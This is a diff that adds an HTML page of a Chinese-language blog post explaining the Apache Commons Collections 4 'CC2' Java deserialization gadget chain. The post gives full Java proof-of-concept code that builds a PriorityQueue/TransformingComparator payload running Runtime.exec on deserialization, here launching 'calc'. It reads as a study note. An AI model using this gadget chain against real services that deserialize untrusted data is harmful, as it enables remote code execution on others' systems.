@@ -1,0 +1,372 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>CommonCollections2 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>CommonCollections2</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/2/25
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/java/" style="color: #03a9f4">java</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="cc2"><a href="#cc2" class="headerlink" title="cc2"></a>cc2</h1><pre><code class="ini">Gadget chain:
+    ObjectInputStream.readObject()
+        PriorityQueue.readObject()
+            ...
+                TransformingComparator.compare()
+                    InvokerTransformer.transform()
+                        Method.invoke()
+                            Runtime.exec()
+</code></pre>
+<p>可以发现 TransformingComparator之后都和之前一样 那么原样照抄之前的</p>
+<p>然后跟进TransformingComparator#compare</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231949456.png" alt="image-20240223194926819"></p>
+<p>往上PriorityQueue#siftDownUsingComparator</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757329.png" alt="image-20240224093144503"></p>
+<p>在PriorityQueue#readObject中调用了heapify heapify调用siftDown siftDown调用siftDownUsingComparator</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757286.png" alt="image-20240224094834202"></p>
+<p> 这里comparator要非空 且我们最终调的就是comparator的compare</p>
+<p>也就是这里的comparator需要是我们的恶意类</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757295.png" alt="image-20240224095015629"></p>
+<p>在这个构造函数中可以传</p>
+<p>于是构造</p>
+<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1,transformingComparator);
+</code></pre>
+<p>然后来看具体的heapify代码 看看能走到compare需要的条件</p>
+<p>直接打断点看看哪儿不满足 不满足的再改</p>
+<p>要想进siftDown size要至少为2</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757310.png" alt="image-20240224095705752"></p>
+<p>于是给PriorityQueue add俩元素</p>
+<pre><code class="java">import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.*;
+import java.util.PriorityQueue;
+
+public class CC2 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+//        new InvokerTransformer().transform()
+        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1,transformingComparator);
+        priorityQueue.add(2);
+        priorityQueue.add(1);
+//        byte[] bytes = serialize(priorityQueue);
+//        unSerialize(bytes);
+    &#125;
+
+
+
+
+    public static byte[] serialize(Object obj) throws IOException &#123;
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        return baos.toByteArray();
+    &#125;
+
+    public static Object unSerialize(byte[] bytes) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+        return  ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>但是发现这里还没有反序列化就弹计算器了</p>
+<p>原因是在add的时候会调offer</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757342.png" alt="image-20240224100054276"></p>
+<p>offer中的siftUp 最终会调用到compare </p>
+<p>为了避免这种情况我们需要反射赋值TransformingComparator</p>
+<p>不管的话会抛异常终止程序运行</p>
+<pre><code class="java">import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class CC2 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
+        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1,transformingComparator);
+        priorityQueue.add(2);
+        priorityQueue.add(1);
+
+        Field field = transformingComparator.getClass().getDeclaredField(&quot;transformer&quot;);
+        field.setAccessible(true);
+        field.set(transformingComparator,chainedTransformer);
+
+//        byte[] bytes = serialize(priorityQueue);
+//        unSerialize(bytes);
+    &#125;
+
+
+
+
+    public static byte[] serialize(Object obj) throws IOException &#123;
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        return baos.toByteArray();
+    &#125;
+
+    public static Object unSerialize(byte[] bytes) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+        return  ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>此时反序列化就能弹计算器了</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757615.png" alt="image-20240224100659049"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
